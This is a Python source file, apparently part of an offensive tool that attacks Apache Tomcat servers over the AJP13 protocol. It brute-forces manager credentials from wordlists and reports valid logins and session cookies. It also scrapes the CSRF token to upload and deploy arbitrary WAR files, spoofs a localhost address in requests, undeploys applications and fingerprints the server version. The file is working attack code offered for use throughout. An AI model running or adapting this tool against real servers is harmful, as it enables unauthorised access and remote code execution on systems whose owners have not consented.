import os
import socket
import re
from pprint import pformat
from helpers.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from helpers import *

# helpers


def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False

    fr.attributes = []

    return fr


class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb", bufsize=0)

    def test_password(self, user, password):
        res = False
        stop = False
        self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + (
            "%s:%s" % (user, password)).encode('base64').replace('\n', '')
        while not stop:
            Logger.log('testing %s:%s' % (user, password), 'info')
            responses = self.forward_request.send_and_receive(
                self.socket, self.stream)
            snd_hdrs_res = responses[0]
            if snd_hdrs_res.http_status_code == 404:
                raise NotFoundException(
                    "The req_uri %s does not exist!" % self.req_uri)
            elif snd_hdrs_res.http_status_code == 302:
                self.req_uri = snd_hdrs_res.response_headers.get(
                    'Location', '')
                Logger.log('redirecting to %s' % self.req_uri, 'info')
                self.forward_request.req_uri = self.req_uri
            elif snd_hdrs_res.http_status_code == 200:
                Logger.log('found valid credz: %s:%s' %
                           (user, password), 'success')
                res = True
                stop = True
                if 'Set-Cookie' in snd_hdrs_res.response_headers:
                    Logger.log('here is your cookie: %s' % (
                        snd_hdrs_res.response_headers.get('Set-Cookie', '')), 'success')
            elif snd_hdrs_res.http_status_code == 403:
                Logger.log('found valid credz: %s:%s but the user is not authorized to access this resource' % (
                    user, password), 'info')
                stop = True
            elif snd_hdrs_res.http_status_code == 401:
                stop = True

        return res

    def start_bruteforce(self, users, passwords, req_uri, autostop):
        Logger.log('attacking a tomcat instance at ajp13://%s:%d%s' %
                   (self.target_host, self.target_port, req_uri), 'info')
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(
            self.target_host, self.req_uri)

        f_users = open(users, "r")
        f_passwords = open(passwords, "r")

        valid_credz = []
        try:
            for user in f_users:
                f_passwords.seek(0, 0)
                for password in f_passwords:
                    if autostop and len(valid_credz) > 0:
                        self.socket.close()
                        return valid_credz

                    user = user.rstrip('\n')
                    password = password.rstrip('\n')
                    if self.test_password(user, password):
                        valid_credz.append((user, password))
        except NotFoundException as e:
            Logger.log(e.message, 'fail')
        finally:
            Logger.log('closing socket...', 'info')
            self.socket.close()
            return valid_credz

    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(
            self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
        # Logger.log('getting resource at ajp13://%s:%d%s' % (self.target_host, self.target_port, req_uri), 'info')
        if user is not None and password is not None:
            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + (
                "%s:%s" % (user, password)).encode('base64').replace('\n', '')

        for h in headers:
            self.forward_request.request_headers[h] = headers[h]

        for a in attributes:
            self.forward_request.attributes.append(a)

        responses = self.forward_request.send_and_receive(
            self.socket, self.stream)
        if len(responses) == 0:
            return None, None

        snd_hdrs_res = responses[0]

        data_res = responses[1:-1]
        if len(data_res) == 0:
            Logger.log('no data in response. headers were:\n%s' %
                       pformat(vars(snd_hdrs_res)), 'fail')

        return snd_hdrs_res, data_res

    def upload(self, filename, user, password, old_version, headers={}):
        # first we request the manager page to get the CSRF token
        hdrs, rdata = self.perform_request(
            "/manager/html", headers=headers, user=user, password=password)
        deploy_csrf_token = re.findall(
            '(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"', "".join([d.data for d in rdata]))
        if old_version == False:
            if len(deploy_csrf_token) == 0:
                Logger.log(
                    'failed to get csrf token, check your creds', 'fail')
                return

            Logger.log('csrf token = %s' % deploy_csrf_token[0], 'info')

        with open(filename, "rb") as f_input:
            with open("/tmp/request", "w+b") as f:
                s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="deployWar"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % os.path.basename(
                    filename)
                s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
                f.write(s_form_header)
                f.write(f_input.read())
                f.write(s_form_footer)

        data_len = os.path.getsize("/tmp/request")

        headers = {
            "SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
            "SC_REQ_CONTENT_LENGTH": "%d" % data_len,
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        obj = re.match(
            "(?P<cookie>JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly", hdrs.response_headers.get('Set-Cookie', ''))
        if obj is not None:
            headers["SC_REQ_COOKIE"] = obj.group('cookie')

        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")}, {
            "name": "req_attribute", "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))}]
        if old_version == False:
            attributes.append(
                {"name": "query_string", "value": deploy_csrf_token[0]})
        r = self.perform_request("/manager/html/upload", headers=headers,
                                 method="POST", user=user, password=password, attributes=attributes)

        with open("/tmp/request", "rb") as f:
            br = AjpBodyRequest(
                f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
            br.send_and_receive(self.socket, self.stream)

        r = AjpResponse.receive(self.stream)
        if r.prefix_code == AjpResponse.END_RESPONSE:
            Logger.log('upload failed', 'fail')

        while r.prefix_code != AjpResponse.END_RESPONSE:
            r = AjpResponse.receive(self.stream)
        Logger.log('upload success!', 'success')

    def execute(self, uri, method, user, password):
        attributes = [{"name": "req_attribute", "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))},
                      {"name": "req_attribute", "value": (
                          "AJP_LOCAL_ADDR", "::1")},
                      {"name": "req_attribute", "value": (
                          "JK_LB_ACTIVATION", "ACT")},
                      ]
        uri, query = uri.split('?', 1)
        if query is not None:
            attributes.append({"name": "query_string", "value": query})

        headers, data = self.perform_request(
            uri, {}, method, user, password, attributes=attributes)
        return [item.data for item in data]

    def undeploy(self, path, user, password, old_version, headers={}):
        # first we request the manager page to get the CSRF token
        hdrs, rdata = self.perform_request(
            "/manager/html", headers=headers, user=user, password=password)
        deploy_csrf_token = re.findall(
            '(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"', "".join([d.data for d in rdata]))
        if old_version == False:
            if len(deploy_csrf_token) == 0:
                Logger.log(
                    'failed to get csrf token. check the credentials', 'fail')
                return

            Logger.log('csrf token = %s' % deploy_csrf_token[0], 'info')

        headers = {
            "SC_REQ_CONTENT_TYPE": "application/x-www-form-urlencoded",
            "SC_REQ_CONTENT_LENGTH": "0",
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        obj = re.match(
            "(?P<cookie>JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly", hdrs.response_headers.get('Set-Cookie', ''))
        if obj is not None:
            headers["SC_REQ_COOKIE"] = obj.group('cookie')

        path_app = "path=%s" % path
        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")},
                      {"name": "req_attribute", "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))}]
        if old_version == False:
            attributes.append({
                "name": "query_string", "value": "%s&%s" % (path_app, deploy_csrf_token[0])})
        r = self.perform_request("/manager/html/undeploy", headers=headers,
                                 method="POST", user=user, password=password, attributes=attributes)

        r = AjpResponse.receive(self.stream)
        if r.prefix_code == AjpResponse.END_RESPONSE:
            Logger.log('undeploy failed', 'fail')

        while r.prefix_code != AjpResponse.END_RESPONSE:
            r = AjpResponse.receive(self.stream)
        Logger.log('undeploy success!', 'success')

    def get_error_page(self):
        return self.perform_request("/0xDEADBEEF")

    def get_version(self):
        hdrs, data = self.get_error_page()
        for d in data:
            s = re.findall('(Apache Tomcat/[0-9\.]+)', d.data)
            if len(s) > 0:
                return s[0]
